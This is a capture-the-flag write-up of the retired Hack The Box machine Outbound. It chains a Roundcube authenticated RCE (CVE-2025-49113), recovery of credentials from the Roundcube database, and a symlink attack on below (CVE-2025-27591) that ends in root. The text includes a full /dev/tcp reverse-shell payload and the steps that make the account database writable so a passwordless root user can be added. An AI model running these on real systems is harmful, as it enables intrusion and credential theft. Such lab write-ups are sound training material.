---
title: "Outbound: Roundcube RCE to Symlink Privilege Escalation"
description: "Authenticated Roundcube RCE (CVE-2025-49113) and session-table password decryption with the application DES key lead to SSH access; a symlink attack on the below utility's error log (CVE-2025-27591) yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - cve
---

## Summary

Outbound is a retired Hack The Box Linux machine. Initial access exploits CVE-2025-49113, an authenticated remote code execution vulnerability in Roundcube webmail, to obtain a shell as `www-data`. Database enumeration reveals stored session data containing encrypted user passwords, which are decrypted using the application's DES key. An email within the recovered account discloses a system password change, enabling SSH access as `<SYSTEM_ACCOUNT>`. Privilege escalation exploits CVE-2025-27591, a symlink attack on the `below` utility's error log, to gain root.

IP addresses, credentials, and internal hostnames are replaced with role-based placeholders throughout. All commands and outputs are quoted evidence from the private walkthrough.

## Context and Objective

The target runs an Nginx web server hosting a Roundcube webmail instance on a Linux host. Provided credentials grant access to the `<WEBMAIL_ACCOUNT>` webmail account. The objective is to enumerate the application, exploit known vulnerabilities, escalate privileges, and obtain root access.

## Approach and Evidence

### Port Scanning

A fast TCP scan reveals open ports and service versions:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

The recorded output shows:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

An Nginx web server redirects to `mail.<DOMAIN>`, indicating a virtual-hosted webmail application.

### Web Reconnaissance

The domain is added to the local hosts file for resolution:

```bash
echo '<TARGET_IP> mail.<DOMAIN> <DOMAIN>' | sudo tee -a /etc/hosts
```

The web application at `http://mail.<DOMAIN>/` is a Roundcube webmail instance. The `<WEBMAIL_ACCOUNT>` account is accessible using the provided credentials.

### CVE-2025-49113 — Authenticated Roundcube RCE

Roundcube is vulnerable to CVE-2025-49113, an authenticated remote code execution vulnerability. A listener is started on the attacker machine, and the exploit is executed against the Roundcube instance:

```bash
php CVE-2025-49113.php http://mail.<DOMAIN>/ '<WEBMAIL_ACCOUNT>' '<WEBMAIL_ACCOUNT_PASSWORD>' 'bash -c "sh -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"'
```

The listener catches the reverse shell as `www-data`.

### Roundcube Database Configuration

The Roundcube configuration file contains the database connection string with MySQL credentials:

```bash
cat /var/www/html/roundcube/config/config.inc.php
```

The configuration reveals the database connection string:

```php
$config['db_dsnw'] = 'mysql://roundcube:<MYSQL_PASSWORD>@localhost/roundcube';
```

The MySQL credentials are extracted and used to access the Roundcube database:

```bash
mysql -u roundcube -p<MYSQL_PASSWORD> roundcube
```

### Session Table Investigation

The `session` table contains active user sessions with serialized PHP data. The `users` table is queried first to identify accounts, then the `session` table is inspected:

```sql
select * from session;
```

The session table contains a serialized PHP session for `<SYSTEM_ACCOUNT>`. The value field is a base64-encoded PHP serialized session blob. The base64 payload is decoded and piped to `tr` to reveal individual fields:

```bash
echo '<BASE64_PAYLOAD>' | base64 -d | tr ';' '\n'
```

The decoded output reveals the serialized PHP session data, including the encrypted password field associated with `<SYSTEM_ACCOUNT>`'s session:

```text
;username|s:<SYSTEM_ACCOUNT_LENGTH>:"<SYSTEM_ACCOUNT>"
;password|s:32:"<ENCRYPTED_PASSWORD>"
```

The `password` field contains a base64-encoded, DES-encrypted value for `<SYSTEM_ACCOUNT>`'s Roundcube account.

### Password Decryption

The Roundcube configuration also contains the DES encryption key:

```php
$config['des_key'] = '<DES_KEY>';
```

A Roundcube DES decryption script is used to recover `<SYSTEM_ACCOUNT>`'s plaintext password:

```bash
python3 rcube-decrypt.py
```

The script prompts for the encrypted password and DES key. The decryption output yields `<SYSTEM_ACCOUNT>`'s Roundcube password.

### Email Disclosure and SSH Access

Logging into Roundcube as `<SYSTEM_ACCOUNT>` with the decrypted password reveals an email from `<WEBMAIL_ACCOUNT>` stating that the system password has been changed:

```text
From: <WEBMAIL_ACCOUNT>

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: <SYSTEM_ACCOUNT_PASSWORD>

Remember to change your password when you next log into your account.

Thanks!

<WEBMAIL_ACCOUNT>
```

The new password is used to log into the machine via SSH:

```bash
sshpass -p '<SYSTEM_ACCOUNT_PASSWORD>' ssh <SYSTEM_ACCOUNT>@<DOMAIN>
```

The connection succeeds:

```text
<SYSTEM_ACCOUNT>@outbound:~$
```

### CVE-2025-27591 — Below Symlink Attack

Sudo privileges are enumerated:

```bash
sudo -l
```

The sudo configuration shows that `below` can be run as root with restrictions:

```text
User <SYSTEM_ACCOUNT> may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d
```

The `below` utility can run as root with sudo, with restrictions on `--config`, `--debug`, and `-d` flags. This version of `below` is vulnerable to CVE-2025-27591, a symlink attack on its error log file.

First, `below` is run to generate its initial log files under `<ROOT_OWNED_LOG_DIRECTORY>`:

```bash
sudo below
```

This creates log files owned by root, including a root-owned error log file.

The root-owned error log is replaced with a symlink pointing to `<PRIVILEGED_TARGET_FILE>` (a sensitive system account database):

```bash
rm -f <ROOT_OWNED_ERROR_LOG>
ln -s <PRIVILEGED_TARGET_FILE> <ROOT_OWNED_ERROR_LOG>
```

Running `below` again with sudo causes the tool to follow the symlink and modify permissions on `<PRIVILEGED_TARGET_FILE>`, making it writable by the current user:

```bash
sudo below
```

A new root-privileged user without a password is appended to the privileged account database:

```bash
<APPEND_ROOT_PRIVILEGED_ACCOUNT_ENTRY> >> <PRIVILEGED_ACCOUNT_DATABASE>
```

Switching to the new user grants a root shell without authentication:

```bash
su <NEW_USER>
```

The shell confirms root access:

```text
root@outbound
```

## Challenges and Decisions

The attack chain required chaining multiple disclosure and vulnerability primitives: authenticated RCE via Roundcube, database access to recover session-encrypted credentials, and email interception to obtain system credentials. Each stage depended on the previous one, and the encrypted password in the session table required the application's DES key for decryption. The `below` symlink exploit required generating initial log files before replacing the error log with a symlink.

## Outcome

Root access was obtained on the machine. The evidence establishes a complete attack chain from initial webmail access through CVE-2025-49113, database session extraction, credential decryption, email-based credential disclosure, SSH access, and privilege escalation via CVE-2025-27591.

## Lessons and Recommendations

- **Update Roundcube.** CVE-2025-49113 is an authenticated RCE. Apply the vendor patch and restrict webmail access with network segmentation. (Recommendation.)
- **Protect application configuration files.** MySQL credentials stored in plaintext `config.inc.php` were accessible to the web application user. Use restricted file permissions (e.g., 640, root-owned) and separate database credentials from the web root. (Recommendation.)
- **Store encrypted secrets outside the database.** The Roundcube session table contained encrypted user passwords recoverable with the application's DES key. Use a key management service or store encrypted secrets outside the database accessible to the web application user. (Recommendation.)
- **Validate log file paths in privileged contexts.** The `below` utility followed symlinks when writing to its error log file, allowing modification of `<PRIVILEGED_TARGET_FILE>`. Validate that log file paths are not symlinks before writing in privileged contexts. (Recommendation.)
- **Isolate web application accounts from system accounts.** The initial `<WEBMAIL_ACCOUNT>` Roundcube credentials led to database access, password decryption, email interception, and ultimately SSH access as `<SYSTEM_ACCOUNT>`. Use separate authentication mechanisms for each layer. (Recommendation.)

## References

- Hack The Box — [Outbound](https://app.hackthebox.com/machines/Outbound) (retired machine)
- CVE-2025-49113 — Roundcube authenticated remote code execution
- CVE-2025-27591 — `below` symlink privilege escalation
